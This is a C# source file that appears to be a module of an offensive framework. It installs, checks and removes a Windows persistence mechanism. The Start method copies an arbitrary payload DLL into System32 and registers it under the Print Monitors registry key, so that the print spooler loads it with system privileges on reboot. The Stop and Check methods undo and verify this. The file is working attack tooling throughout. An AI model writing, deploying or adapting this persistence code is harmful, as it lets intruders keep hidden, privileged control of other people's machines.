using System;
using System.IO;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SYSTEM\CurrentControlSet\Control\Print\Monitors";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultName = "{R2-117}";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 portmon_dlls Start {defaultName} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return "[-] Access denied opening Print\\Monitors registry key. Run as administrator.";

                using var existing = baseKey.OpenSubKey(name);

                if (existing != null)
                    return $"[*] Port monitor '{name}' already registered.";

                using var monitorKey = baseKey.CreateSubKey(name, writable: true);

                if (monitorKey == null)
                    return $"[-] Failed to create monitor subkey '{name}'.";

                string dllName = Path.GetFileName(payloadPath);
                string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string targetPath = Path.Combine(system32, dllName);

                if (!File.Exists(targetPath))
                    File.Copy(payloadPath, targetPath, overwrite: false);

                monitorKey.SetValue("Driver", dllName);

                return $"[+] Installed port monitor '{name}' | " +
                       $"DLL copied to System32: '{targetPath}' | " +
                       $"Reboot required to load into spoolsv.exe.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Port monitor registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return "[-] Access denied opening Print\\Monitors registry key. Run as administrator.";

                using var existing = baseKey.OpenSubKey(name);

                if (existing == null)
                    return $"[*] Port monitor '{name}' not found.";

                string dllName = existing.GetValue("Driver")?.ToString();

                baseKey.DeleteSubKeyTree(name);

                if (!string.IsNullOrEmpty(dllName))
                {
                    string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    string targetPath = Path.Combine(system32, dllName);

                    if (File.Exists(targetPath))
                    {
                        try
                        {
                            File.Delete(targetPath);
                        }
                        catch (IOException)
                        {
                            return $"[+] Removed registry key for '{name}'. " +
                                   $"DLL is locked in System32 and requires a system reboot or service restart to release.";
                        }
                    }
                }

                return $"[+] Removed port monitor '{name}' and deleted DLL from System32.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Port monitor removal requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string name = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);

                if (baseKey == null)
                    return "[-] Access denied opening Print\\Monitors registry key. Run as administrator.";

                using var monitorKey = baseKey.OpenSubKey(name);

                if (monitorKey == null)
                    return $"[*] Port monitor '{name}' not found.";

                string dllName = monitorKey.GetValue("Driver")?.ToString();
                string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string dllPath = Path.Combine(system32, dllName ?? "");
                bool dllExists = File.Exists(dllPath);

                return $"[+] Verified port monitor '{name}' | " +
                       $"Driver: '{dllName}' | " +
                       $"DLL in System32: {dllExists}";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}